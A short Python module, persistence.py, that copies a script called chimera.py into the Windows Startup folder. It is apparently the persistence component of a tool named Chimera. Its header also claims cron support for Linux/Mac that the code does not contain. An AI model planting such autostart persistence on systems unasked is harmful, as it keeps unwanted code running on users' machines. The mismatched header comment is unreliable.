# persistence.py
# Adds the Chimera script to the Startup folder (Windows) or a cron job (Linux/Mac).

import os
import shutil

def add_to_startup():
    """
    Adds the main Chimera script to the system's autorun (Startup folder).
    Only works on Windows.
    """
    # Path to Chimera's script
    script_path = os.path.abspath("chimera.py")
    # Windows Startup folder for the current user
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    target_path = os.path.join(startup_folder, 'chimera.py')

    try:
        # Copy the file
        shutil.copy(script_path, target_path)
        print(f"[+] Chimera added to Startup: {target_path}")
    except Exception as e:
        print(f"[!] Failed to add Chimera to Startup: {e}")

if __name__ == "__main__":
    add_to_startup()
